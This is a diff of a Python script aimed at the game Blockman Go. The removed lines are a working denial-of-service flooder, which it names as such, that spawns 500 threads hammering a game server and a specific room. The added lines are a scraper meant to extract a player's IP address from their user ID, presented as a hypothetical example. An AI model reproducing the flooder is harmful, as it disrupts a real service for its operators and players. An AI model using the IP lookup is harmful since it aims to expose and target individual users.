@@ -1,36 +1,36 @@
-import socket
-import threading
-import time
+import requests
+import re
+from bs4 import BeautifulSoup
 
-# Configuration
-TARGET_IP = "play.blockman.go"  # Replace with the actual IP if needed
-TARGET_PORT = 30000  # Replace with the actual port if needed
-ROOM_NUMBER = "102579"  # Replace with the actual room number
-NUM_THREADS = 500  # Increased number of threads
-MESSAGE = f"GET /room/{ROOM_NUMBER} HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"
-DELAY = 0.1  # Delay between requests in seconds
+def get_ip_from_uid(uid):
+    # Define the Blockman Go URL pattern
+    base_url = f"https://blockmango.com/user/{uid}"
 
-def ddos():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((TARGET_IP, TARGET_PORT))
-            s.sendall(MESSAGE.encode('utf-8'))
-            s.close()
-            time.sleep(DELAY)  # Add a delay between requests
-        except:
-            pass
+    try:
+        # Send a GET request to the Blockman Go user profile page
+        response = requests.get(base_url)
 
-# Create and start threads
-threads = []
-for _ in range(NUM_THREADS):
-    t = threading.Thread(target=ddos)
-    t.start()
-    threads.append(t)
+        # Check if the request was successful
+        if response.status_code == 200:
+            # Parse the HTML content of the page
+            soup = BeautifulSoup(response.content, 'html.parser')
 
-# Keep the main thread alive
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("DDoS attack stopped.")
+            # Search for the IP address in the page content
+            # This is a hypothetical example; adjust the regular expression as needed
+            ip_pattern = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')
+            ip_address = ip_pattern.search(soup.get_text())
+
+            if ip_address:
+                return ip_address.group()
+            else:
+                return "IP address not found on the page."
+        else:
+            return f"Failed to retrieve data. Status code: {response.status_code}"
+    except requests.exceptions.RequestException as e:
+        return f"An error occurred: {e}"
+
+if __name__ == "__main__":
+    # Example usage
+    user_id = input("6892835886: ")
+    ip_address = get_ip_from_uid(user_id)
+    print(f"The IP address for user ID {user_id} is: {ip_address}")
